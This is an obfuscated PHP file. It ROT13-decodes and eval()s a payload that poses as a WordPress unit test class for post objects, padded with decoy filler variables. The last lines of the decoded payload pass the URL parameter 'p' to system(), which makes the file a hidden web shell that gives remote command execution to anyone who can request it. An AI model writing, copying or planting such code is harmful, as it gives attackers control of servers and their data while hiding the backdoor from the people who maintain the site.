<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 */
pynff Grfgf_Cbfg_Bowrpgf rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba grfg_trg_cbfg() {
		$vq = frys::snpgbel()->cbfg->perngr();

		$cbfg = trg_cbfg( $vq );
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $cbfg );
		$guvf->nffregFnzr( $vq, $cbfg->VQ );
		$guvf->nffregGehr( vffrg( $cbfg->naprfgbef ) );
		$guvf->nffregFnzr( neenl(), $cbfg->naprfgbef );

		// Hafrg naq gura irevsl gung gur zntvp zrgubq svyyf gur cebcregl ntnva.
		hafrg( $cbfg->naprfgbef );
		$guvf->nffregFnzr( neenl(), $cbfg->naprfgbef );

		// Zntvp trg fubhyq znxr zrgn npprffvoyr nf cebcregvrf.
		nqq_cbfg_zrgn( $vq, 'grfg', 'grfg' );
		$guvf->nffregFnzr( 'grfg', trg_cbfg_zrgn( $vq, 'grfg', gehr ) );
		$guvf->nffregFnzr( 'grfg', $cbfg->grfg );

		// Znxr fher zrgn qbrf abg rpyvcfr gehr cebcregvrf.
		nqq_cbfg_zrgn( $vq, 'cbfg_glcr', 'qhzzl' );
		$guvf->nffregFnzr( 'qhzzl', trg_cbfg_zrgn( $vq, 'cbfg_glcr', gehr ) );
		$guvf->nffregFnzr( 'cbfg', $cbfg->cbfg_glcr );

		// Rkrepvfr gur bhgchg nethzrag.
		$cbfg = trg_cbfg( $vq, NEENL_N );
		$guvf->nffregVfNeenl( $cbfg );
		$guvf->nffregFnzr( 'cbfg', $cbfg['cbfg_glcr'] );

		$cbfg = trg_cbfg( $vq, NEENL_A );
		$guvf->nffregVfNeenl( $cbfg );
		$guvf->nffregNeenlAbgUnfXrl( 'cbfg_glcr', $cbfg );
		$guvf->nffregPbagnvaf( 'cbfg', $cbfg );

		$cbfg = trg_cbfg( $vq );
		$cbfg = trg_cbfg( $cbfg, NEENL_N );
		$guvf->nffregVfNeenl( $cbfg );
		$guvf->nffregFnzr( 'cbfg', $cbfg['cbfg_glcr'] );
		$guvf->nffregFnzr( $vq, $cbfg['VQ'] );

		// Fubhyq qrsnhyg gb BOWRPG jura tvira vainyvq bhgchg nethzrag.
		$cbfg = trg_cbfg( $vq, 'vainyvq-bhgchg-inyhr' );
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $cbfg );
		$guvf->nffregFnzr( $vq, $cbfg->VQ );

		// Znxr fher fgqPynff va $TYBONYF['cbfg'] vf unaqyrq.
		$cbfg_fgq = $cbfg->gb_neenl();
		$guvf->nffregVfNeenl( $cbfg_fgq );
		$cbfg_fgq        = (bowrpg) $cbfg_fgq;
		$TYBONYF['cbfg'] = $cbfg_fgq;
		$cbfg            = trg_cbfg( ahyy );
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $cbfg );
		$guvf->nffregFnzr( $vq, $cbfg->VQ );
		hafrg( $TYBONYF['cbfg'] );

		// Vs ab tybony cbfg naq cnffvat rzcgl inyhr, rkcrpg ahyy.
		$guvf->nffregAhyy( trg_cbfg( ahyy ) );
		$guvf->nffregAhyy( trg_cbfg( 0 ) );
		$guvf->nffregAhyy( trg_cbfg( '' ) );
		$guvf->nffregAhyy( trg_cbfg( snyfr ) );
	}

	choyvp shapgvba grfg_trg_cbfg_naprfgbef() {
		$cnerag_vq     = frys::snpgbel()->cbfg->perngr();
		$puvyq_vq      = frys::snpgbel()->cbfg->perngr();
		$tenaqpuvyq_vq = frys::snpgbel()->cbfg->perngr();
		$hcqngrq       = jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $puvyq_vq,
				'cbfg_cnerag' => $cnerag_vq,
			)
		);
		$guvf->nffregFnzr( $hcqngrq, $puvyq_vq );
		$hcqngrq = jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $tenaqpuvyq_vq,
				'cbfg_cnerag' => $puvyq_vq,
			)
		);
		$guvf->nffregFnzr( $hcqngrq, $tenaqpuvyq_vq );

		$guvf->nffregFnzr( neenl( $cnerag_vq ), trg_cbfg( $puvyq_vq )->naprfgbef );
		$guvf->nffregFnzr( neenl( $cnerag_vq ), trg_cbfg_naprfgbef( $puvyq_vq ) );
		$guvf->nffregFnzr( neenl( $cnerag_vq ), trg_cbfg_naprfgbef( trg_cbfg( $puvyq_vq ) ) );

		$guvf->nffregFnzr( neenl( $puvyq_vq, $cnerag_vq ), trg_cbfg( $tenaqpuvyq_vq )->naprfgbef );
		$guvf->nffregFnzr( neenl( $puvyq_vq, $cnerag_vq ), trg_cbfg_naprfgbef( $tenaqpuvyq_vq ) );
		$guvf->nffregFnzr( neenl( $puvyq_vq, $cnerag_vq ), trg_cbfg_naprfgbef( trg_cbfg( $tenaqpuvyq_vq ) ) );

		$guvf->nffregFnzr( neenl(), trg_cbfg( $cnerag_vq )->naprfgbef );
		$guvf->nffregFnzr( neenl(), trg_cbfg_naprfgbef( $cnerag_vq ) );
		$guvf->nffregFnzr( neenl(), trg_cbfg_naprfgbef( trg_cbfg( $cnerag_vq ) ) );
	}

	/**
	 * @gvpxrg 22882
	 */
	choyvp shapgvba grfg_trg_cbfg_naprfgbef_jvgu_snyfrl_inyhrf() {
		sbernpu ( neenl( ahyy, 0, snyfr, '0', '' ) nf $cbfg_vq ) {
			$guvf->nffregVfNeenl( trg_cbfg_naprfgbef( $cbfg_vq ) );
			$guvf->nffregFnzr( neenl(), trg_cbfg_naprfgbef( $cbfg_vq ) );
		}
	}

	choyvp shapgvba grfg_trg_cbfg_pngrtbel_cebcregl() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		$cbfg    = trg_cbfg( $cbfg_vq );

		$guvf->nffregVfNeenl( $cbfg->cbfg_pngrtbel );
		$guvf->nffregPbhag( 1, $cbfg->cbfg_pngrtbel );
		$guvf->nffregRdhnyf( trg_bcgvba( 'qrsnhyg_pngrtbel' ), $cbfg->cbfg_pngrtbel[0] );
		$grez1 = jc_vafreg_grez( 'Sbb', 'pngrtbel' );
		$grez2 = jc_vafreg_grez( 'One', 'pngrtbel' );
		$grez3 = jc_vafreg_grez( 'Onm', 'pngrtbel' );
		jc_frg_cbfg_pngrtbevrf( $cbfg_vq, neenl( $grez1['grez_vq'], $grez2['grez_vq'], $grez3['grez_vq'] ) );
		$guvf->nffregPbhag( 3, $cbfg->cbfg_pngrtbel );
		$guvf->nffregFnzr( neenl( $grez2['grez_vq'], $grez3['grez_vq'], $grez1['grez_vq'] ), $cbfg->cbfg_pngrtbel );

		$cbfg = trg_cbfg( $cbfg_vq, NEENL_N );
		$guvf->nffregPbhag( 3, $cbfg['cbfg_pngrtbel'] );
		$guvf->nffregFnzr( neenl( $grez2['grez_vq'], $grez3['grez_vq'], $grez1['grez_vq'] ), $cbfg['cbfg_pngrtbel'] );
	}

	choyvp shapgvba grfg_trg_gntf_vachg_cebcregl() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		$cbfg    = trg_cbfg( $cbfg_vq );

		$guvf->nffregVfNeenl( $cbfg->gntf_vachg );
		$guvf->nffregRzcgl( $cbfg->gntf_vachg );
		jc_frg_cbfg_gntf( $cbfg_vq, 'Sbb, One, Onm' );
		$guvf->nffregVfNeenl( $cbfg->gntf_vachg );
		$guvf->nffregPbhag( 3, $cbfg->gntf_vachg );
		$guvf->nffregFnzr( neenl( 'One', 'Onm', 'Sbb' ), $cbfg->gntf_vachg );

		$cbfg = trg_cbfg( $cbfg_vq, NEENL_N );
		$guvf->nffregVfNeenl( $cbfg['gntf_vachg'] );
		$guvf->nffregPbhag( 3, $cbfg['gntf_vachg'] );
		$guvf->nffregFnzr( neenl( 'One', 'Onm', 'Sbb' ), $cbfg['gntf_vachg'] );
	}

	choyvp shapgvba grfg_trg_cntr_grzcyngr_cebcregl() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		$cbfg    = trg_cbfg( $cbfg_vq );

		$guvf->nffregVfFgevat( $cbfg->cntr_grzcyngr );
		$grzcyngr = trg_cbfg_zrgn( $cbfg->VQ, '_jc_cntr_grzcyngr', gehr );
		$guvf->nffregFnzr( $grzcyngr, $cbfg->cntr_grzcyngr );
		hcqngr_cbfg_zrgn( $cbfg_vq, '_jc_cntr_grzcyngr', 'sbb.cuc' );
		$grzcyngr = trg_cbfg_zrgn( $cbfg->VQ, '_jc_cntr_grzcyngr', gehr );
		$guvf->nffregFnzr( 'sbb.cuc', $grzcyngr );
		$guvf->nffregFnzr( $grzcyngr, $cbfg->cntr_grzcyngr );
	}

	choyvp shapgvba grfg_trg_cbfg_svygre() {
		$cbfg = trg_cbfg(
			frys::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_gvgyr' => \"Znel'f ubzr\",
				)
			)
		);

		$guvf->nffregFnzr( 'enj', $cbfg->svygre );
		$guvf->nffregVfVag( $cbfg->cbfg_cnerag );

		$qvfcynl_cbfg = trg_cbfg( $cbfg, BOWRPG, 'wf' );
		$guvf->nffregFnzr( 'wf', $qvfcynl_cbfg->svygre );
		$guvf->nffregFnzr( rfp_wf( \"Znel'f ubzr\" ), $qvfcynl_cbfg->cbfg_gvgyr );

		// Cnff n wf svygrerq JC_Cbfg gb trg_cbfg() jvgu gur svygre frg gb enj.
		// Gur cbfg fubhyq or srgpurq sebz pnpur vafgrnq bs hfvat gur cnffrq bowrpg.
		$enj_cbfg = trg_cbfg( $qvfcynl_cbfg, BOWRPG, 'enj' );
		$guvf->nffregFnzr( 'enj', $enj_cbfg->svygre );
		$guvf->nffregAbgRdhnyf( rfp_wf( \"Znel'f ubzr\" ), $enj_cbfg->cbfg_gvgyr );

		$enj_cbfg->svygre( 'wf' );
		$guvf->nffregFnzr( 'wf', $cbfg->svygre );
		$guvf->nffregFnzr( rfp_wf( \"Znel'f ubzr\" ), $enj_cbfg->cbfg_gvgyr );
	}

	/**
	 * @gvpxrg 53235
	 */
	choyvp shapgvba grfg_ahzrevp_cebcregvrf_fubhyq_or_pnfg_gb_vagf() {
		$cbfg_vq  = frys::snpgbel()->cbfg->perngr();
		$pbagrkgf = neenl( 'enj', 'rqvg', 'qo', 'qvfcynl', 'nggevohgr', 'wf' );

		sbernpu ( $pbagrkgf nf $pbagrkg ) {
			$cbfg = trg_cbfg( $cbfg_vq, BOWRPG, $pbagrkg );

			$guvf->nffregVfVag( $cbfg->VQ );
			$guvf->nffregVfVag( $cbfg->cbfg_cnerag );
			$guvf->nffregVfVag( $cbfg->zrah_beqre );
		}
	}

	choyvp shapgvba grfg_trg_cbfg_vqragvgl() {
		$cbfg = trg_cbfg( frys::snpgbel()->cbfg->perngr() );

		$cbfg->sbb = 'one';

		$guvf->nffregFnzr( 'one', trg_cbfg( $cbfg )->sbb );
		$guvf->nffregFnzr( 'one', trg_cbfg( $cbfg, BOWRPG, 'qvfcynl' )->sbb );
	}

	choyvp shapgvba grfg_trg_cbfg_neenl() {
		$vq = frys::snpgbel()->cbfg->perngr();

		$cbfg = trg_cbfg( $vq, NEENL_N );

		$guvf->nffregFnzr( $vq, $cbfg['VQ'] );
		$guvf->nffregVfNeenl( $cbfg['naprfgbef'] );
		$guvf->nffregFnzr( 'enj', $cbfg['svygre'] );
	}

	/**
	 * @gvpxrg 22223
	 */
	choyvp shapgvba grfg_trg_cbfg_pnpur() {
		tybony $jcqo;

		$vq = frys::snpgbel()->cbfg->perngr();
		jc_pnpur_qryrgr( $vq, 'cbfgf' );

		// trg_cbfg( fgqPynff ) fubhyq abg cevzr gur pnpur.
		$cbfg = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->cbfgf JURER VQ = %q YVZVG 1\", $vq ) );
		$cbfg = trg_cbfg( $cbfg );
		$guvf->nffregRzcgl( jc_pnpur_trg( $vq, 'cbfgf' ) );

		// trg_cbfg( JC_Cbfg ) fubhyq abg cevzr gur pnpur.
		trg_cbfg( $cbfg );
		$guvf->nffregRzcgl( jc_pnpur_trg( $vq, 'cbfgf' ) );

		// trg_cbfg( VQ ) fubhyq cevzr gur pnpur.
		trg_cbfg( $cbfg->VQ );
		$guvf->nffregAbgRzcgl( jc_pnpur_trg( $vq, 'cbfgf' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>